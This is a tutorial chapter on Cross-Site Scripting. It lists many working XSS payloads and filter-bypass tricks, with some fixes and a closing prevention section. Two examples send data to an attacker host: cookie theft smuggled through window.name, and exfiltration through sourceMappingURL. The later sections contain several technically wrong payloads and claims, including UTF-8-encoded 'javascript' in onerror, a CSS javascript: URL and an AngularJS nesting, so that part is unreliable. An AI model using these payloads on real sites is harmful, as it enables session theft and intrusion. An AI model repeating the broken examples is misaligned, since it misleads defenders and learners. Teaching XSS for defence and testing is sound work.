# XSS

### XSS Introduction

In this chapter, we'll delve into the fascinating world of Cross-Site Scripting, commonly referred to as XSS. The name might be a bit misleading since it includes both same-site and cross-origin scripting, but it has stuck around. This chapter will cover various XSS tricks and combine techniques from previous chapters to create some interesting payloads. Let's get started!

## Closing Scripts

The first technique involves using a closing script block inside a JavaScript string. This method is well-known in the XSS community but might be new to developers. The idea is that when there is reflection inside a JavaScript string and the injected quote is correctly escaped, but the less-than (`<`) and greater-than (`>`) characters are not, you can inject a closing script tag inside the JavaScript string. This will close the script block, throw a JavaScript exception due to the unclosed string, and then you can inject your HTML to achieve XSS:

```html
<script>
let foo = "</script><img/src/onerror=alert(1337)>";
</script>
```

To patch this vulnerability, escape the forward slash (`/`) using a backslash (`\`). However, the better fix is to Unicode escape less-than and greater-than characters to ensure the HTML won't render inside the string. Of course, you should also escape or encode backslashes and quotes.

## Comments Inside Scripts

Fixing the previous vulnerability by escaping the forward slash might not be enough. If you have two injection points, one inside a JavaScript variable and another inside an HTML attribute, you can inject an opening HTML comment tag and script. This prevents the script from closing and the script block will continue until it encounters another closing script tag. Here's an example:

```html
<script>
let foo = "<!--<script>";
</script>
<img title="</script><img/src/onerror=alert(1)>">
```

This will render as:

```html
<script>
let foo = "<!--<script>";
</script>
<img title="</script><img src="" onerror="alert(1)">">
```

## HTML Entities Inside SVG Script

You might think that correctly escaping characters can prevent XSS inside script blocks. However, inside SVG, it's different because SVG is an XML format. HTML entities are rendered inside, and when decoded by SVG, JavaScript will get the correct unencoded characters:

```html
<svg>
<script>let foo = "&quot;-alert(1)///";</script>
</svg>
```

## Script Without Closing Script

Contrary to popular belief, you don't always need a closing script tag when using a script block, at least in Firefox. If you use SVG, you can have a self-closing script:

```html
<svg><script href=data:,alert(1) />
```

Use the `href` attribute because you're inside SVG, and the `src` attribute isn't supported there.

## Window Name Payloads

Another common XSS trick is using `window.name` to smuggle payloads to other domains or pages. Although browsers are cracking down on this by removing the name for top-level cross-domain navigations, it still works using iframes:

```html
<iframe src=//target name=alert(1)></iframe>
<!-- target -->
<script>eval(name)</script>
```

You can even smuggle cookies and retrieve them when the page navigates to a page you control:

```html
<script>name=document.cookie</script>
<a href="//attacker">test</a>
<!-- Attacker controlled page -->
<script>fetch('/collect-cookie', {method:"post", body:name})</script>
```

## Assignable Protocol

A more recent discovery is using the `protocol` property of the `location` object to conceal a payload. This is an improvement on `window.name` payloads because it doesn't require a separate page. Simply assign "javascript" to the `protocol` property, and because the URL is treated as JavaScript with `http://` as a comment, you can use a newline in the hash or query string to execute arbitrary JavaScript:

```javascript
location.protocol='javascript'
```

```html
foo.html#%0aalert(1337)
```

Browsers have patched this trick, but for a time, the following worked in Safari:

```javascript
location.protocol='javascript'
```

```html
foo.html#%E2%80%A8%E2%80%A9alert(1)
```

## Source Maps to Create Pingbacks

Source maps can be used to create a DNS/HTTP interaction to exfiltrate data. If you have injection inside a single-line comment, a source map request can exfiltrate the data. This requires that the victim has devtools open. If you get a pingback, you can be sure your victim had devtools open:

```html
//# sourceMappingURL=https://attacker?
```

Use an Out-of-Band (OOB) tool such as Burp Collaborator or Interactsh because devtools don't show the request in the network tab.

## New Redirection Sink

Chrome introduced `navigation.navigate()`, a new way of causing a client-side redirect. Using this method, you can specify a JavaScript URL to call arbitrary JavaScript:

```javascript
navigation.navigate('javascript:alert(1337)')
```

## JavaScript Comments

JavaScript supports various comment syntaxes. Different types of single-line comments include:

```javascript
// Standard comment
<!-- HTML-style comment
--!> HTML-style closing comment
```

The first example works only if it’s the first JavaScript statement. The second and third examples act like standard comments but were added in the early days of the web when scripts weren’t supported by all browsers. JavaScript also supports one type of multiline comment:

```javascript
/*
I'm a multiline comment
*/
```

## New Lines

JavaScript supports multiple characters for separating statements, including carriage return, line feed, line separator, and paragraph separator:

```javascript
eval('//\ralert(1337)'); // Carriage return
eval('//\nalert(1337)'); // Line feed
eval('//\u2028alert(1337)'); // Line separator
eval('//\u2029alert(1337)'); // Paragraph separator
```

If a single-line comment injection is blocked by a new line, try alternative characters.

## Whitespace

JavaScript has many whitespace characters that can help bypass basic WAFs using regular expressions. Test for whitespace using:

```javascript
let log = [];
function funct() {}
for (let i = 0; i <= 0x10FFFF; i++) {
  try {
    eval(`funct${String.fromCodePoint(i)}()`);
    log.push(i);
  } catch (e) {}
}
console.log(log);
```

Use raw characters or HTML-encoded ones for SVG or HTML attributes:

```html
<img/src/onerror=alert&#65279;(1)>
```

## Dynamic Imports

JavaScript allows dynamically loading modules using `import()`. It lets the JavaScript engine decide if it’s needed, and you can specify URLs to import or use a data URL to execute arbitrary JavaScript:

```javascript
import('data:text/javascript,alert(1)')
```

## XHTML Namespace in XML

If you control an XML file with a content type of `text/xml`, you can still execute JavaScript by providing an XHTML namespace:

```xml
<xml>
  <text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>
```

This can be useful for file uploads or REST API responses served with an XML content type.

## SVG Uploads

Allowing image file uploads can lead to XSS if SVGs are uploaded, as scripts inside SVG documents are executed. Ensure the correct namespace attributes are added and follow XML parsing rules:

```xml
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'>
  <image href="1" onerror="alert(1)" />
</svg>
```

To prevent this, filter the SVG or serve it with a `Content-Disposition` header with the value `attachment`.

## SVG Use Elements

You can get JavaScript execution by embedding an SVG document using the `<use>` element inside SVG, provided the document is on the same domain or using data URLs:

```xml
<svg>
  <use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
</svg>
```

Modern browsers now restrict data URLs with use elements.

## HTML Entities

HTML has a wide range of encoding options, including:

**Decimal Entities**

Represent characters using character codes prefixed with `&#` and followed by an optional semicolon:

```html
<a href="&#106;avascript:alert(1337)">test1</a>
<a href="&#106avascript:alert(1337)">test2</a>
<a href="&#00000000106avascript:alert(1337)">test3</a>
```

Hexadecimal Entities

Represent characters using a code prefixed with `&#x` or `&#X` and an optional semicolon:

```html
<a href="&#x6aavascript:alert(1337)">test1</a>
<a href="&#x00006Aavascript:alert(1337)">test2</a>
```

Some HTML attribute values also support numeric entities.

**Named Entities**

These are readable representations of characters:

```html
<a href="&Tab;avascript:alert(1337)">test1</a>
<a href="&NewLine;avascript:alert(1337)">test2</a>
```

Use named entities if numeric ones are sanitized.

**UTF-8 Encodings**

Browsers interpret UTF-8-encoded HTML documents, so you can represent characters using this encoding, like in URLs:

```html
<img src="1" onerror="ja%c6%8dvascript:alert(1)">
```

## Events

JavaScript events can be exploited for XSS by injecting malicious scripts into event handlers. Here are some common event attributes that can be abused:

* `onclick`: Triggered when an element is clicked.
* `onload`: Triggered when an element has finished loading.
* `onmouseover`: Triggered when the mouse pointer is moved onto an element.

Example:

```html
<a href="#" onclick="alert('XSS')">Click me</a>
<img src="nonexistent.jpg" onerror="alert('XSS')">
<div onmouseover="alert('XSS')">Hover over me</div>
```

## Data URLs

Data URLs can contain JavaScript payloads and be used in various attributes, such as `src`, `href`, and `style`. Example:

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
<img src="data:image/svg+xml;base64,PHN2ZyBvbmVycm9yPSJhbGVydCgnWFNTJyk+PC9zdmc+">
```

## Template Injection

Template engines like Mustache, Handlebars, and AngularJS can be vulnerable to XSS if not properly sanitized. Example with AngularJS:

```html
<div ng-app="">
  <div ng-init="x=1">
    {{x}}
  </div>
</div>
```

If user input is directly bound to the scope, an attacker can inject AngularJS expressions:

```html
<div ng-app="">
  <div ng-init="x=1">
    {{x}}
    <div ng-init="evil=1+{{alert('XSS')}}"></div>
  </div>
</div>
```

## XSS through CSS

CSS can be abused to execute JavaScript in some browsers by using expressions (although deprecated) or by leveraging certain properties:

```css
body { background-image: url("javascript:alert('XSS')"); }
```

## XSS via JSONP

JSONP (JSON with Padding) can be used to deliver JavaScript payloads. If an application uses JSONP and reflects user input in the callback function, it can lead to XSS:

```javascript
<script src="https://example.com/jsonp?callback=alert(1)"></script>
```

## DOM XSS

DOM-based XSS occurs when JavaScript manipulates the DOM and introduces malicious input without proper sanitization. Example:

```html
<script>
  var search = location.search;
  document.write(search);
</script>
```

If the URL contains `?alert(1)`, it will be written directly to the document, causing XSS.

## XSS in PDF

PDF files can contain JavaScript, and if an attacker can upload a PDF file, they can inject scripts that execute when the PDF is opened:

```javascript
this.getField('text').value = 'XSS';
app.alert('XSS');
```

## XSS via Flash

Flash content can be abused for XSS if an application allows uploading of Flash files. Although Flash is largely deprecated, some legacy systems still support it. Example:

```actionscript
getURL("javascript:alert('XSS');");
```

## Preventing XSS

To prevent XSS, follow these best practices:

* **Input Validation**: Validate and sanitize all user inputs.
* **Output Encoding**: Encode data before rendering it in the browser (HTML, JavaScript, URL encoding).
* **Content Security Policy (CSP)**: Implement a CSP to restrict the sources from which content can be loaded.
* **Use Secure Libraries**: Use libraries and frameworks that provide built-in XSS protection.
* **Avoid Dangerous APIs**: Avoid using `eval()`, `innerHTML`, and other dangerous APIs that execute or interpret code.

#### Conclusion

Cross-Site Scripting (XSS) is a pervasive and potentially devastating security vulnerability. This chapter has covered various XSS techniques, ranging from script injections to leveraging modern JavaScript features and manipulating HTML entities. By understanding these techniques, you can better protect your web applications against XSS attacks. Always stay updated with the latest security practices and continuously test your applications for vulnerabilities.
